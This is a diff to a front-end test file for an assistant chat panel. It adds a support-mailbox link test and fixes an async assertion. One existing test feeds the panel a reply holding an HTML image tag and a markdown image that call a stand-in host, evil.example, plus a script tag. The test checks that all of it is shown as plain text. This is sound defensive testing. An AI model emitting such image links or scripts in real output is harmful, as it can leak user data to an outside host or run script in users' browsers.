@@ -48,6 +48,16 @@ describe('AssistantPanel', () => {
     expect(go).toHaveBeenCalledWith('wallet');
   });
 
+  it('the empty panel points to the support mailbox (a mailto link, the brand address only) and drops the line once a conversation has started', async () => {
+    mount(fakeApi());
+    const link = screen.getByRole('link', { name: 'ahlan@ebda.app' });
+    expect(link.getAttribute('href')).toBe('mailto:ahlan@ebda.app');
+    expect(link.closest('p')!.textContent).toContain(t.assistantSupport);
+    await ask();
+    await screen.findByRole('link', { name: new RegExp(t.assistantShowMe) });
+    expect(screen.queryByRole('link', { name: 'ahlan@ebda.app' })).toBeNull();
+  });
+
   it('never renders an <img> or markup from reply text: it is plain text', async () => {
     const api = fakeApi({ turn: vi.fn(async () => reply({ segments: [{ kind: 'text', text: '<img src="https://evil.example/p?d=1"> ![x](https://evil.example/p) <script>alert(1)</script>' }] })) });
     const { container } = mount(api);
@@ -118,7 +128,8 @@ describe('AssistantPanel', () => {
     mount(fakeApi({ turn: vi.fn(async () => reply({ status: 'off', segments: [] })) }), { onUnavailable: gone });
     await ask();
     await waitFor(() => expect(gone).toHaveBeenCalled());
-    expect(screen.getByText(t.assistantOff)).toBeTruthy();
+    // onUnavailable fires in the same tick as setOff(true), before React has rendered it: wait for the note instead of assuming it is already there.
+    expect(await screen.findByText(t.assistantOff)).toBeTruthy();
     expect((screen.getByLabelText(t.assistantPlaceholder) as HTMLTextAreaElement).disabled).toBe(true);
   });
 
